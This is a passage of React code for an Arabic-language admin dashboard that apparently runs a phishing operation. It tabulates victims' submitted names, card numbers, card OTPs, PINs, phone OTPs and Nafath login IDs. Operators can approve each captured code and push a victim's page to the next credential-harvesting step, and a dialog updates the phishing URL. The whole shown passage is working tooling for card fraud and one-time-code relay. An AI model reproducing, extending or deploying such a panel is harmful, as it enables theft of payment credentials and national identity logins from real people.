      router.push("/login");
    } catch (error) {
      console.error("Error signing out:", error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      });
    }
  };

  const handleSearch = (term: string) => {
    setSearchTerm(term);
  };

  const handlePageChange = (page: number) => {
    setCurrentPage(page);
  };

  const handleRefresh = () => {
    setIsLoading(true);
    fetchNotifications();
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20 flex items-center justify-center">
        <div className="flex flex-col items-center gap-4">
          <div className="relative">
            <div className="h-12 w-12 animate-spin rounded-full border-4 border-primary/20 border-t-primary"></div>
            <div className="absolute inset-0 h-12 w-12 animate-pulse rounded-full bg-primary/10"></div>
          </div>
          <div className="text-lg font-medium">جاري التحميل...</div>
        </div>
      </div>
    );
  }

  const visitorTrend = [5, 8, 12, 7, 10, 15, 13];
  const cardTrend = [2, 3, 5, 4, 6, 8, 7];
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6];
  const approvedTrend = [1, 2, 4, 3, 5, 7, 6];

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-background via-background to-muted/20"
    >
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent side="right" className="w-[250px] sm:w-[400px]" dir="rtl">
          <SheetHeader className="mb-6">
            <SheetTitle className="flex items-center gap-2">
              <Bell className="h-5 w-5 text-primary" />
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-6">
            <div className="flex items-center gap-4">
              <Avatar>
                <AvatarImage
                  src="/placeholder.svg?height=40&width=40"
                  alt="صورة المستخدم"
                />
                <AvatarFallback>M</AvatarFallback>
              </Avatar>
              <div>
                <p className="font-medium">مدير النظام</p>
                <p className="text-sm text-muted-foreground">
                  admin@example.com
                </p>
              </div>
            </div>

            <Separator />
            <nav className="space-y-2">
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => setMobileMenuOpen(false)}
              >
                <Bell className="mr-2 h-4 w-4" />
                الإشعارات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => setSettingsOpen(true)}
              >
                <Settings className="mr-2 h-4 w-4" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start"
                onClick={() => {
                  setExportDialogOpen(true);
                  setMobileMenuOpen(false);
                }}
              >
                <Download className="mr-2 h-4 w-4" />
                تصدير البيانات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start text-destructive"
                onClick={handleLogout}
              >
                <LogOut className="mr-2 h-4 w-4" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      <ExportDialog
        open={exportDialogOpen}
        onOpenChange={setExportDialogOpen}
        notifications={filteredNotifications}
      />

      {/* Enhanced Header */}
      <header className="sticky top-0 z-50 border-b bg-background/80 backdrop-blur-xl supports-[backdrop-filter]:bg-background/60">
        <div className="flex items-center justify-between p-4">
          <div className="flex items-center gap-4">
            <Button
              variant="ghost"
              size="icon"
              className="md:hidden"
              onClick={() => setMobileMenuOpen(true)}
            >
              <Menu className="h-5 w-5" />
            </Button>
            <div className="flex items-center gap-3">
              <div className="relative">
                <div className="bg-gradient-to-br from-primary to-primary/80 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-primary-foreground" />
                </div>
                {pendingCount > 0 && (
                  <div className="absolute -top-1 -right-1 bg-destructive text-destructive-foreground text-xs rounded-full h-5 w-5 flex items-center justify-center animate-pulse">
                    {pendingCount}
                  </div>
                )}
              </div>
              <div>
                <h1 className="text-xl font-bold bg-gradient-to-r from-foreground to-foreground/70 bg-clip-text text-transparent">
                  لوحة الإشعارات المتقدمة
                </h1>
                <p className="text-sm text-muted-foreground">
                  آخر تحديث: {format(new Date(), "HH:mm", { locale: ar })}
                </p>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleShowStatistics}
                    className="relative overflow-hidden bg-transparent"
                  >
                    {showStatistics ? (
                      <Eye className="h-4 w-4" />
                    ) : (
                      <EyeOff className="h-4 w-4" />
                    )}
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>اخفاء البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <TooltipProvider>
              <Tooltip>
                <TooltipTrigger asChild>
                  <Button
                    variant="outline"
                    size="icon"
                    onClick={handleRefresh}
                    className="relative overflow-hidden bg-transparent"
                  >
                    <RefreshCw
                      className={`h-4 w-4 ${isLoading ? "animate-spin" : ""}`}
                    />
                  </Button>
                </TooltipTrigger>
                <TooltipContent>
                  <p>تحديث البيانات</p>
                </TooltipContent>
              </Tooltip>
            </TooltipProvider>

            <Dialog>
              <DialogTrigger asChild>
                <Button variant="outline">Update URL</Button>
              </DialogTrigger>

              <DialogContent className="sm:max-w-md">
                <DialogHeader>
                  <DialogTitle>Update URL</DialogTitle>
                </DialogHeader>

                <div className="space-y-3 py-2">
                  <Label htmlFor="url">New URL</Label>
                  <Input
                    id="url"
                    type="url"
                    placeholder="https://example.com"
                    value={tempUrl}
                    onChange={(e) => setTempUrl(e.target.value)}
                  />
                </div>

                <DialogFooter>
                  <Button type="button" variant="secondary">
                    Cancel
                  </Button>
                  <Button type="button" onClick={() => saveLink(tempUrl)}>
                    Save
                  </Button>
                </DialogFooter>
              </DialogContent>
            </Dialog>

            <div className="hidden md:flex items-center gap-2">
              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setSettingsOpen(true)}
                    >
                      <Settings className="h-4 w-4" />
                      <span className="sr-only">الإعدادات</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>الإعدادات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <TooltipProvider>
                <Tooltip>
                  <TooltipTrigger asChild>
                    <Button
                      variant="outline"
                      size="icon"
                      onClick={() => setExportDialogOpen(true)}
                    >
                      <Download className="h-4 w-4" />
                      <span className="sr-only">تصدير</span>
                    </Button>
                  </TooltipTrigger>
                  <TooltipContent>
                    <p>تصدير البيانات</p>
                  </TooltipContent>
                </Tooltip>
              </TooltipProvider>

              <Button
                variant="destructive"
                onClick={handleClearAll}
                disabled={notifications.length === 0}
                className="hidden sm:flex items-center gap-2"
              >
                <Trash2 className="h-4 w-4" />
                مسح الكل
              </Button>
            </div>

            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <Button
                  variant="ghost"
                  className="relative h-10 w-10 rounded-full"
                >
                  <Avatar className="h-10 w-10 ring-2 ring-primary/20">
                    <AvatarImage
                      src="/placeholder.svg?height=40&width=40"
                      alt="صورة المستخدم"
                    />
                    <AvatarFallback className="bg-gradient-to-br from-primary to-primary/80 text-primary-foreground">
                      مد
                    </AvatarFallback>
                  </Avatar>
                </Button>
              </DropdownMenuTrigger>
              <DropdownMenuContent align="end" className="w-56">
                <DropdownMenuLabel>
                  <div className="flex flex-col space-y-1">
                    <p className="text-sm font-medium">مدير النظام</p>
                    <p className="text-xs text-muted-foreground">
                      admin@example.com
                    </p>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem onClick={() => setSettingsOpen(true)}>
                  <Settings className="ml-2 h-4 w-4" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuItem onClick={() => setExportDialogOpen(true)}>
                  <Download className="ml-2 h-4 w-4" />
                  تصدير البيانات
                </DropdownMenuItem>
                <DropdownMenuSeparator />
                <DropdownMenuItem
                  onClick={handleLogout}
                  className="text-destructive"
                >
                  <LogOut className="ml-2 h-4 w-4" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </div>
        </div>
      </header>

      <div className="p-6">
        {/* Enhanced Statistics Grid */}
        <div
          className={`grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8 ${showStatistics ? "" : "hidden"}`}
        >
          <StatisticsCard
            title="إجمالي الزوار"
            value={totalVisitorsCount}
            change="+12%"
            changeType="increase"
            icon={Users}
            colorClass="bg-gradient-to-br from-blue-500 to-blue-600"
            trend={visitorTrend}
          />
          <StatisticsCard
            title="المستخدمين المتصلين"
            value={onlineUsersCount}
            change="+5%"
            changeType="increase"
            icon={UserCheck}
            colorClass="bg-gradient-to-br from-emerald-500 to-emerald-600"
            trend={onlineTrend}
          />
          <StatisticsCard
            title="معلومات البطاقات"
            value={cardSubmissionsCount}
            change="+8%"
            changeType="increase"
            icon={CreditCard}
            colorClass="bg-gradient-to-br from-purple-500 to-purple-600"
            trend={cardTrend}
          />
          <StatisticsCard
            title="الموافقات"
            value={approvedCount}
            change="+15%"
            changeType="increase"
            icon={CheckCircle}
            colorClass="bg-gradient-to-br from-teal-500 to-teal-600"
            trend={approvedTrend}
          />
        </div>

        <Card className="bg-card/50 backdrop-blur-sm border-0 shadow-xl">
          <CardHeader className="pb-4">
            <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
              <div>
                <CardTitle className="text-2xl font-bold flex items-center gap-3">
                  <Activity className="h-6 w-6 text-primary" />
                  إدارة الإشعارات
                </CardTitle>
                <CardDescription className="mt-1">
                  عرض وإدارة جميع الإشعارات والبيانات المستلمة
                </CardDescription>
              </div>

              <div className="flex flex-col sm:flex-row gap-3">
                <SearchBar onSearch={handleSearch} />
                <div className="flex gap-2">
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button
                        variant="outline"
                        size="sm"
                        className="gap-2 bg-transparent"
                      >
                        <Filter className="h-4 w-4" />
                        فلترة
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setFilterType("all")}>
                        جميع الإشعارات
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("card")}>
                        البطاقات فقط
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setFilterType("online")}>
                        المتصلين فقط
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>

                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button
                        variant="outline"
                        size="sm"
                        className="gap-2 bg-transparent"
                      >
                        <ArrowUpDown className="h-4 w-4" />
                        ترتيب
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuItem onClick={() => setSortBy("date")}>
                        حسب التاريخ
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("status")}>
                        حسب الحالة
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSortBy("country")}>
                        حسب الدولة
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </div>
            </div>

            <div className="flex flex-wrap gap-2 mt-4">
              <Button
                variant={filterType === "all" ? "default" : "outline"}
                onClick={() => setFilterType("all")}
                size="sm"
                className="gap-2"
              >
                الكل
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {notifications.length}
                </Badge>
              </Button>
              <Button
                variant={filterType === "card" ? "default" : "outline"}
                onClick={() => setFilterType("card")}
                size="sm"
                className="gap-2"
              >
                <CreditCard className="h-4 w-4" />
                البطاقات
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {cardSubmissionsCount}
                </Badge>
              </Button>
              <Button
                variant={filterType === "online" ? "default" : "outline"}
                onClick={() => setFilterType("online")}
                size="sm"
                className="gap-2"
              >
                <UserCheck className="h-4 w-4" />
                المتصلين
                <Badge
                  variant="secondary"
                  className="bg-background text-foreground"
                >
                  {onlineUsersCount}
                </Badge>
              </Button>
            </div>
          </CardHeader>

          <CardContent className="p-0">
            <div className="hidden lg:block overflow-x-auto">
              <table className="w-full">
                <thead>
                  <tr className="border-b bg-muted/30">
                    <th className="px-4 py-4 text-right font-semibold text-muted-foreground">
                      الزائر
                    </th>
                    <th className="px-4 py-4 text-right font-semibold text-muted-foreground">
                      المعلومات
                    </th>
                    <th className="px-4 py-4 text-center font-semibold text-muted-foreground">
                      حالة الموافقات
                    </th>
                    <th className="px-4 py-4 text-right font-semibold text-muted-foreground">
                      الوقت
                    </th>
                    <th className="px-4 py-4 text-center font-semibold text-muted-foreground">
                      الاتصال
                    </th>
                    <th className="px-4 py-4 text-center font-semibold text-muted-foreground">
                      الصفحة
                    </th>
                    <th className="px-4 py-4 text-center font-semibold text-muted-foreground">
                      الإجراءات
                    </th>
                  </tr>
                </thead>
                <tbody>
                  {paginatedNotifications.map((notification) => (
                    <tr
                      key={notification.id}
                      className="border-b hover:bg-muted/20 transition-colors"
                    >
                      <td className="px-4 py-4">
                        <div className="flex items-center gap-3">
                          <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center relative">
                            <User className="h-5 w-5 text-primary" />
                            {onlineStatuses[notification.id] && (
                              <div className="absolute -bottom-0.5 -right-0.5 w-3 h-3 bg-emerald-500 rounded-full border-2 border-background animate-pulse" />
                            )}
                          </div>
                          <div className="flex flex-col">
                            <span className="font-medium text-sm">
                              {notification.id.slice(0, 12)}...
                            </span>
                            <span className="text-xs text-muted-foreground flex items-center gap-1">
                              <span className="inline-block w-4 h-3 rounded-sm overflow-hidden">
                                🌍
                              </span>
                              {notification.country || "غير معروف"}
                            </span>
                          </div>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-wrap gap-1.5">
                          <Badge
                            variant={
                              notification?.fullName ? "default" : "secondary"
                            }
                            className={`cursor-pointer text-xs ${notification.phone2 ? "animate-bounce" : ""} transition-all hover:scale-105 ${
                              notification?.fullName
                                ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "personal")
                            }
                          >
                            <User className="h-3 w-3 mr-1" />
                            شخصي
                          </Badge>
                          <Badge
                            variant={
                              notification.cardNumber ? "default" : "secondary"
                            }
                            className={`cursor-pointer text-xs transition-all hover:scale-105 ${
                              notification.cardNumber
                                ? "bg-gradient-to-r from-emerald-500 to-emerald-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "card")
                            }
                          >
                            <CreditCard className="h-3 w-3 mr-1" />
                            {notification.cardLast4
                              ? `****${notification.cardLast4}`
                              : "بطاقة"}
                          </Badge>
                          <Badge
                            variant={
                              notification.nafazId ? "default" : "secondary"
                            }
                            className={`cursor-pointer text-xs transition-all hover:scale-105 ${
                              notification.nafazId
                                ? "bg-gradient-to-r from-amber-500 to-amber-600 text-white"
                                : ""
                            }`}
                            onClick={() =>
                              handleInfoClick(notification, "nafaz")
                            }
                          >
                            نفاذ
                          </Badge>
                        </div>
                        <div className="flex flex-wrap gap-1.5 mt-2">
                          {notification?.cardOtp && (
                            <Badge className="bg-blue-600 text-xs font-bold px-2 py-1">
                              <CreditCard className="h-3 w-3 mr-1" />
                              OTP: {notification.cardOtp}
                            </Badge>
                          )}
                          {(notification?.cardPin || notification?.pinCode) && (
                            <Badge className="bg-purple-600 text-xs font-bold px-2 py-1">
                              <LockIcon className="h-3 w-3 mr-1" />
                              PIN:{" "}
                              {notification.cardPin || notification.pinCode}
                            </Badge>
                          )}
                          {(notification?.phoneOtp ||
                            notification?.phoneOtpCode) && (
                            <Badge className="bg-pink-600 text-xs font-bold px-2 py-1">
                              <Phone className="h-3 w-3 mr-1" />
                              Phone:{" "}
                              {notification.phoneOtp ||
                                notification.phoneOtpCode}
                            </Badge>
                          )}
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-wrap gap-1.5 justify-center">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.cardOtpApproved === true
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : notification.cardOtpApproved === false
                                        ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                        : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() =>
                                    handleApprovalToggle(
                                      notification.id,
                                      "cardOtpApproved",
                                      !notification.cardOtpApproved,
                                    )
                                  }
                                >
                                  <CreditCard
                                    className={`h-4 w-4 ${notification.cardOtpApproved === true ? "text-emerald-600" : notification.cardOtpApproved === false ? "text-amber-600" : "text-gray-400"}`}
                                  />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>OTP البطاقة</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.cardPinApproved === true
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : notification.cardPinApproved === false
                                        ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                        : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() =>
                                    handleApprovalToggle(
                                      notification.id,
                                      "cardPinApproved",
                                      !notification.cardPinApproved,
                                    )
                                  }
                                >
                                  <LockIcon
                                    className={`h-4 w-4 ${notification.cardPinApproved === true ? "text-emerald-600" : notification.cardPinApproved === false ? "text-amber-600" : "text-gray-400"}`}
                                  />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>PIN البطاقة</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.phoneOtpApproved === true
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : notification.phoneOtpApproved === false
                                        ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                        : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() =>
                                    handleApprovalToggle(
                                      notification.id,
                                      "phoneOtpApproved",
                                      !notification.phoneOtpApproved,
                                    )
                                  }
                                >
                                  <Phone
                                    className={`h-4 w-4 ${notification.phoneOtpApproved === true ? "text-emerald-600" : notification.phoneOtpApproved === false ? "text-amber-600" : "text-gray-400"}`}
                                  />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>OTP الهاتف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <div
                                  className={`w-8 h-8 rounded-full flex items-center justify-center cursor-pointer transition-all ${
                                    notification.nafathApproved === true
                                      ? "bg-emerald-100 dark:bg-emerald-900/30"
                                      : notification.nafathApproved === false
                                        ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                        : "bg-gray-100 dark:bg-gray-800"
                                  }`}
                                  onClick={() =>
                                    handleApprovalToggle(
                                      notification.id,
                                      "nafathApproved",
                                      !notification.nafathApproved,
                                    )
                                  }
                                >
                                  <ClipboardCheck
                                    className={`h-4 w-4 ${notification.nafathApproved === true ? "text-emerald-600" : notification.nafathApproved === false ? "text-amber-600" : "text-gray-400"}`}
                                  />
                                </div>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>نفاذ</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex flex-col text-sm">
                          <span className="text-muted-foreground">
                            {notification.createdDate &&
                              format(
                                new Date(notification.createdDate),
                                "HH:mm",
                                { locale: ar },
                              )}
                          </span>
                          <span className="text-xs text-muted-foreground/70">
                            {notification.createdDate &&
                              format(
                                new Date(notification.createdDate),
                                "dd/MM/yyyy",
                                { locale: ar },
                              )}
                          </span>
                        </div>
                      </td>
                      <td className="px-4 py-4 text-center">
                        <UserStatus userId={notification.id} />
                      </td>
                      <td className="px-4 py-4 text-center">
                        <div className="flex flex-col gap-2">
                          <Badge variant="outline" className="text-xs">
                            {notification?.currentStep || "الرئيسية"}
                          </Badge>
                          <Select
                            value={notification?.currentStep || ""}
                            onValueChange={(value) =>
                              handleStepChange(notification.id, value)
                            }
                          >
                            <SelectTrigger className="h-7 text-xs w-32">
                              <SelectValue placeholder="اختر الخطوة" />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="cart">السلة</SelectItem>
                              <SelectItem value="shipping">الشحن</SelectItem>
                              <SelectItem value="payment">الدفع</SelectItem>
                              <SelectItem value="card-otp">
                                OTP البطاقة
                              </SelectItem>
                              <SelectItem value="card-pin">
                                PIN البطاقة
                              </SelectItem>
                              <SelectItem value="phone-verification">
                                التحقق من الهاتف
                              </SelectItem>
                              <SelectItem value="phone-otp">
                                OTP الهاتف
                              </SelectItem>
                              <SelectItem value="nafath">نفاذ</SelectItem>
                              <SelectItem value="auth-dialog">
                                حوار المصادقة
                              </SelectItem>
                              <SelectItem value="success">نجاح</SelectItem>
                            </SelectContent>
                          </Select>
                        </div>
                      </td>
                      <td className="px-4 py-4">
                        <div className="flex justify-center gap-1">
                          <TooltipProvider>
                            <Tooltip>
                              <TooltipTrigger asChild>
                                <Button
                                  variant="ghost"
                                  size="icon"
                                  className="h-8 w-8 text-destructive hover:bg-destructive/10"
                                  onClick={() => handleDelete(notification.id)}
                                >
                                  <Trash2 className="h-4 w-4" />
                                </Button>
                              </TooltipTrigger>
                              <TooltipContent>
                                <p>حذف</p>
                              </TooltipContent>
                            </Tooltip>
                          </TooltipProvider>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            <div className="lg:hidden space-y-4 p-4">
              {paginatedNotifications.map((notification) => (
                <Card key={notification.id} className="overflow-hidden">
                  <CardHeader className="pb-3 bg-muted/20">
                    <div className="flex justify-between items-start">
                      <div className="flex items-center gap-3">
                        <div className="w-10 h-10 rounded-full bg-gradient-to-br from-primary/20 to-primary/10 flex items-center justify-center">
                          <User className="h-5 w-5 text-primary" />
                        </div>
                        <div>
                          <p className="font-semibold">
                            {notification.country || "غير معروف"}
                          </p>
                          <p className="text-sm text-muted-foreground">
                            {notification.createdDate &&
                              format(
                                new Date(notification.createdDate),
                                "HH:mm dd/MM",
                                { locale: ar },
                              )}
                          </p>
                        </div>
                      </div>
                      <UserStatus userId={notification.id} />
                    </div>
                  </CardHeader>

                  <CardContent className="pt-4 space-y-4">
                    <div className="flex flex-wrap gap-2">
                      <Badge
                        variant={
                          notification.fullName ? "default" : "secondary"
                        }
                        className={`cursor-pointer text-xs ${notification.phone2 ? "animate-bounce" : ""} ${
                          notification.fullName
                            ? "bg-gradient-to-r from-blue-500 to-blue-600 text-white"
                            : ""
                        }`}
                        onClick={() =>
                          handleInfoClick(notification, "personal")
                        }
                      >
                        <User className="h-3 w-3 mr-1" />
                        شخصي
                      </Badge>
                      <Badge
                        variant={
                          notification.cardNumber ? "default" : "secondary"
                        }
                        className={`cursor-pointer text-xs ${
                          notification.cardNumber
                            ? "bg-gradient-to-r from-emerald-500 to-emerald-600 text-white"
                            : ""
                        }`}
                        onClick={() => handleInfoClick(notification, "card")}
                      >
                        <CreditCard className="h-3 w-3 mr-1" />
                        {notification.cardLast4
                          ? `****${notification.cardLast4}`
                          : "بطاقة"}
                      </Badge>
                      <Badge
                        variant={notification.nafazId ? "default" : "secondary"}
                        className={`cursor-pointer text-xs ${
                          notification.nafazId
                            ? "bg-gradient-to-r from-amber-500 to-amber-600 text-white"
                            : ""
                        }`}
                        onClick={() => handleInfoClick(notification, "nafaz")}
                      >
                        نفاذ
                      </Badge>
                    </div>

                    <div className="flex flex-wrap gap-1.5">
                      {notification?.cardOtp && (
                        <Badge className="bg-blue-600 text-xs font-bold px-2 py-1">
                          <CreditCard className="h-3 w-3 mr-1" />
                          OTP: {notification.cardOtp}
                        </Badge>
                      )}
                      {(notification?.cardPin || notification?.pinCode) && (
                        <Badge className="bg-purple-600 text-xs font-bold px-2 py-1">
                          <LockIcon className="h-3 w-3 mr-1" />
                          PIN: {notification.cardPin || notification.pinCode}
                        </Badge>
                      )}
                      {(notification?.phoneOtp ||
                        notification?.phoneOtpCode) && (
                        <Badge className="bg-pink-600 text-xs font-bold px-2 py-1">
                          <Phone className="h-3 w-3 mr-1" />
                          Phone:{" "}
                          {notification.phoneOtp || notification.phoneOtpCode}
                        </Badge>
                      )}
                    </div>

                    <div className="pt-3 border-t">
                      <p className="text-sm font-medium text-muted-foreground mb-2">
                        حالة الموافقات:
                      </p>
                      <div className="flex flex-wrap gap-2">
                        <div
                          className={`w-9 h-9 rounded-full flex items-center justify-center cursor-pointer ${
                            notification.cardOtpApproved === true
                              ? "bg-emerald-100 dark:bg-emerald-900/30"
                              : notification.cardOtpApproved === false
                                ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                : "bg-gray-100 dark:bg-gray-800"
                          }`}
                          onClick={() =>
                            handleApprovalToggle(
                              notification.id,
                              "cardOtpApproved",
                              !notification.cardOtpApproved,
                            )
                          }
                        >
                          <CreditCard
                            className={`h-4 w-4 ${notification.cardOtpApproved === true ? "text-emerald-600" : notification.cardOtpApproved === false ? "text-amber-600" : "text-gray-400"}`}
                          />
                        </div>
                        <div
                          className={`w-9 h-9 rounded-full flex items-center justify-center cursor-pointer ${
                            notification.cardPinApproved === true
                              ? "bg-emerald-100 dark:bg-emerald-900/30"
                              : notification.cardPinApproved === false
                                ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                : "bg-gray-100 dark:bg-gray-800"
                          }`}
                          onClick={() =>
                            handleApprovalToggle(
                              notification.id,
                              "cardPinApproved",
                              !notification.cardPinApproved,
                            )
                          }
                        >
                          <LockIcon
                            className={`h-4 w-4 ${notification.cardPinApproved === true ? "text-emerald-600" : notification.cardPinApproved === false ? "text-amber-600" : "text-gray-400"}`}
                          />
                        </div>
                        <div
                          className={`w-9 h-9 rounded-full flex items-center justify-center cursor-pointer ${
                            notification.phoneOtpApproved === true
                              ? "bg-emerald-100 dark:bg-emerald-900/30"
                              : notification.phoneOtpApproved === false
                                ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                : "bg-gray-100 dark:bg-gray-800"
                          }`}
                          onClick={() =>
                            handleApprovalToggle(
                              notification.id,
                              "phoneOtpApproved",
                              !notification.phoneOtpApproved,
                            )
                          }
                        >
                          <Phone
                            className={`h-4 w-4 ${notification.phoneOtpApproved === true ? "text-emerald-600" : notification.phoneOtpApproved === false ? "text-amber-600" : "text-gray-400"}`}
                          />
                        </div>
                        <div
                          className={`w-9 h-9 rounded-full flex items-center justify-center cursor-pointer ${
                            notification.nafathApproved === true
                              ? "bg-emerald-100 dark:bg-emerald-900/30"
                              : notification.nafathApproved === false
                                ? "bg-amber-100 dark:bg-amber-900/30 animate-pulse"
                                : "bg-gray-100 dark:bg-gray-800"
                          }`}
                          onClick={() =>
                            handleApprovalToggle(
                              notification.id,
                              "nafathApproved",
                              !notification.nafathApproved,
                            )
                          }
                        >
                          <ClipboardCheck
                            className={`h-4 w-4 ${notification.nafathApproved === true ? "text-emerald-600" : notification.nafathApproved === false ? "text-amber-600" : "text-gray-400"}`}
                          />
                        </div>
                      </div>
                    </div>

                    <div className="pt-3 border-t">
                      <div className="flex items-center justify-between mb-2">
                        <span className="text-sm text-muted-foreground">
                          الصفحة الحالية:
                        </span>
                        <Badge variant="outline" className="text-xs">
                          {notification?.currentPage || "الرئيسية"}
                        </Badge>
                      </div>
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground">
                          الخطوة الحالية:
                        </span>
                        <Select
                          value={notification?.currentStep || ""}
                          onValueChange={(value) =>
                            handleStepChange(notification.id, value)
                          }
                        >
                          <SelectTrigger className="h-8 text-xs w-36">
                            <SelectValue placeholder="اختر الخطوة" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="cart">السلة</SelectItem>
                            <SelectItem value="shipping">الشحن</SelectItem>
                            <SelectItem value="payment">الدفع</SelectItem>
                            <SelectItem value="card-otp">
                              OTP البطاقة
                            </SelectItem>
                            <SelectItem value="card-pin">
                              PIN البطاقة
                            </SelectItem>
                            <SelectItem value="phone-verification">
                              التحقق من الهاتف
                            </SelectItem>
                            <SelectItem value="phone-otp">
                              OTP الهاتف
                            </SelectItem>
                            <SelectItem value="nafath">نفاذ</SelectItem>
                            <SelectItem value="auth-dialog">
                              حوار المصادقة
                            </SelectItem>
                            <SelectItem value="success">نجاح</SelectItem>
                          </SelectContent>
                        </Select>
                      </div>
                    </div>

                    {notification.phone2 && (
                      <div className="flex items-center gap-2">
                        <span className="text-sm text-muted-foreground">
                          الهاتف:
                        </span>
                        <Badge variant="secondary" className="text-xs">
                          {notification.phone2}
                        </Badge>
                      </div>
                    )}

                    <div className="flex gap-2 pt-2 border-t">
                      <Button
                        variant="outline"
                        onClick={() => handleDelete(notification.id)}
                        className="ml-auto text-destructive hover:text-destructive hover:bg-destructive/10"
                        size="sm"
                      >
                        <Trash2 className="h-4 w-4" />
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              ))}
            </div>

            {paginatedNotifications.length === 0 && (
              <div className="text-center py-12">
                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-muted flex items-center justify-center">
                  <Bell className="h-8 w-8 text-muted-foreground" />
                </div>
                <h3 className="text-lg font-semibold mb-2">لا توجد إشعارات</h3>
                <p className="text-muted-foreground">
                  لا توجد إشعارات متطابقة مع الفلتر المحدد
                </p>
              </div>
            )}
          </CardContent>

          {filteredNotifications.length > 0 && (
